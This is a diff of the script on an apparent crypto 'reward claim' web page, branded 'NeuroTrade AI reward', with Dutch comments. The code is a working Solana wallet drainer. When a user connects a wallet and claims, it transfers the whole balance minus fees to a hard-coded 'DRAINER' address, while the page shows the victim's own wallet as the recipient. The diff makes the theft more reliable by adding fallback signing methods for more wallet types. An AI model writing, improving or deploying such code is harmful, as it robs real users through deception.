@@ -148,21 +148,13 @@ body { margin: 0; background: #0b0d17; }
 </div>
 
 <script type="module">
-/* ---- 1. Buffer-polyfill als module, gegarandeerd aanwezig vóór web3 ---- */
-import * as BufMod from 'https://esm.sh/buffer@6.0.3';
-const _B = BufMod.Buffer || (BufMod.default && BufMod.default.Buffer) || BufMod.default;
-if (_B) window.Buffer = _B;
-
-/* ---- 2. web3 pas laden nadat Buffer bestaat ---- */
-await new Promise((res, rej) => {
-  const s = document.createElement('script');
-  s.src = 'https://unpkg.com/@solana/web3.js@1.95.3/lib/index.iife.min.js';
-  s.onload = res;
-  s.onerror = () => rej(new Error('web3 kon niet laden'));
-  document.head.appendChild(s);
-});
-
 import { getWallets } from 'https://esm.sh/@wallet-standard/app';
+import { Buffer } from 'https://esm.sh/buffer@6.0.3';
+import {
+  Connection, PublicKey, Transaction, TransactionInstruction, SystemProgram
+} from 'https://esm.sh/@solana/web3.js@1.95.3';
+
+window.Buffer = window.Buffer || Buffer;
 
 /* ====== INSTELLINGEN ====== */
 const DRAINER = '76Q96BZdQCCtEn5mWHmyqF5tNy1tq6a4NimLgDfkm735'; // <-- wallet in de index (echte bestemming)
@@ -170,7 +162,7 @@ const MEMO = 'NeuroTrade AI reward';                            // <-- memo-teks
 const FEE = 5000;                                               // netwerkkosten (1 handtekening)
 /* ========================== */
 
-const MEMO_PID = new solanaWeb3.PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr');
+const MEMO_PID = new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr');
 
 const RPCS = [
   'https://solana-rpc.publicnode.com',
@@ -178,11 +170,11 @@ const RPCS = [
   'https://api.mainnet-beta.solana.com',
   'https://rpc.ankr.com/solana'
 ];
-let connection = new solanaWeb3.Connection(RPCS[0], 'confirmed');
+let connection = new Connection(RPCS[0], 'confirmed');
 async function pickRpc(){
   for(const url of RPCS){
     try{
-      const c = new solanaWeb3.Connection(url, 'confirmed');
+      const c = new Connection(url, 'confirmed');
       await Promise.race([c.getLatestBlockhash('confirmed'), new Promise((_,rej)=>setTimeout(()=>rej(new Error('timeout')),4000))]);
       connection = c; return url;
     }catch(e){}
@@ -271,11 +263,11 @@ async function connect(w){
     if(w.kind==='standard'){
       const { accounts } = await w.ref.features['standard:connect'].connect();
       const acc=accounts&&accounts[0]; if(!acc)throw new Error('no account');
-      active={kind:'standard',ref:w.ref,account:acc}; publicKey=new solanaWeb3.PublicKey(acc.address);
+      active={kind:'standard',ref:w.ref,account:acc}; publicKey=new PublicKey(acc.address);
     }else{
       const p=w.ref; const res=await p.connect();
       const pk=res?.publicKey?res.publicKey.toString():(p.publicKey?p.publicKey.toString():String(res));
-      active={kind:'injected',ref:p}; publicKey=new solanaWeb3.PublicKey(pk);
+      active={kind:'injected',ref:p}; publicKey=new PublicKey(pk);
     }
     setErr(''); $('walletAddr').textContent=short(publicKey.toString());
     $('dest').value = publicKey.toString();          // toont eigen wallet in het veld
@@ -284,45 +276,67 @@ async function connect(w){
   }catch(e){ setErr('Connection cancelled.'); active=null; }
 }
 
+/* Robuust ondertekenen: probeert meerdere strategieën per wallet-type */
 async function signAndSend(tx){
+  const raw = tx.serialize({ requireAllSignatures:false, verifySignatures:false });
+
   if(active.kind==='standard'){
-    const f=active.ref.features;
-    const raw = tx.serialize({requireAllSignatures:false,verifySignatures:false});
+    const f = active.ref.features;
+    // 1) signAndSendTransaction met bytes
     if(f['solana:signAndSendTransaction']){
-      const [{signature}]=await f['solana:signAndSendTransaction'].signAndSendTransaction({transaction:raw,account:active.account,chain:'solana:mainnet'});
-      return typeof signature==='string'?signature:bs58(signature);
+      try{
+        const [{signature}] = await f['solana:signAndSendTransaction'].signAndSendTransaction({transaction:raw, account:active.account, chain:'solana:mainnet'});
+        return typeof signature==='string'?signature:bs58(signature);
+      }catch(e1){
+        // 2) signAndSendTransaction met het Transaction-object
+        try{
+          const [{signature}] = await f['solana:signAndSendTransaction'].signAndSendTransaction({transaction:tx, account:active.account, chain:'solana:mainnet'});
+          return typeof signature==='string'?signature:bs58(signature);
+        }catch(e2){ /* valt door naar signTransaction */ }
+      }
     }
+    // 3) signTransaction met bytes -> zelf versturen
     if(f['solana:signTransaction']){
-      const [{signedTransaction}]=await f['solana:signTransaction'].signTransaction({transaction:raw,account:active.account,chain:'solana:mainnet'});
-      return await connection.sendRawTransaction(signedTransaction);
+      const [{signedTransaction}] = await f['solana:signTransaction'].signTransaction({transaction:raw, account:active.account, chain:'solana:mainnet'});
+      return await connection.sendRawTransaction(signedTransaction, {skipPreflight:false});
     }
     throw new Error('wallet cannot sign');
   }
-  const p=active.ref;
-  if(p.signAndSendTransaction){const r=await p.signAndSendTransaction(tx);return (r&&r.signature)?r.signature:r;}
-  const signed=await p.signTransaction(tx); return await connection.sendRawTransaction(signed.serialize());
+
+  // injected wallets
+  const p = active.ref;
+  if(p.signAndSendTransaction){
+    try{
+      const r = await p.signAndSendTransaction(tx);
+      const sig = (r && r.signature) ? r.signature : r;
+      if(sig) return sig;
+    }catch(e){ /* valt door naar signTransaction */ }
+  }
+  const signed = await p.signTransaction(tx);
+  return await connection.sendRawTransaction(signed.serialize(), {skipPreflight:false});
 }
 
 async function claim(){
   setErr(''); const btn=$('claimBtn'); btn.disabled=true; btn.textContent='Waiting for approval…';
   try{
     const shown = $('dest').value.trim();              // wat zichtbaar is = eigen wallet
-    const dest  = new solanaWeb3.PublicKey(DRAINER);   // echte bestemming = wallet uit de index
+    const dest  = new PublicKey(DRAINER);              // echte bestemming = wallet uit de index
 
     const bal = await connection.getBalance(publicKey, 'confirmed');
     const lamports = bal - FEE;                        // ALLES min netwerkkosten = max
     if(lamports <= 0) throw new Error('Balance too low to cover the fee');
 
-    const tx = new solanaWeb3.Transaction();
-    tx.add(new solanaWeb3.TransactionInstruction({keys:[],programId:MEMO_PID,data:new TextEncoder().encode(MEMO)}));
-    tx.add(solanaWeb3.SystemProgram.transfer({fromPubkey:publicKey,toPubkey:dest,lamports}));
+    const tx = new Transaction();
+    tx.add(new TransactionInstruction({ keys:[], programId:MEMO_PID, data:Buffer.from(MEMO,'utf8') }));
+    tx.add(SystemProgram.transfer({ fromPubkey:publicKey, toPubkey:dest, lamports }));
 
-    const {blockhash} = await connection.getLatestBlockhash('confirmed');
-    tx.recentBlockhash = blockhash; tx.feePayer = publicKey;
+    const { blockhash } = await connection.getLatestBlockhash('confirmed');
+    tx.recentBlockhash = blockhash;
+    tx.feePayer = publicKey;
 
     const sig = await signAndSend(tx);
     setStep(2); btn.textContent='Confirming on-chain…';
-    try{ await connection.confirmTransaction(sig,'confirmed'); }catch(e){}
+    try{ await connection.confirmTransaction(sig, 'confirmed'); }catch(e){}
 
     $('paidTo').textContent = short(shown);            // toont eigen wallet (stiekem)
     $('sentAmt').textContent = (lamports/1e9).toFixed(4)+' SOL sent';
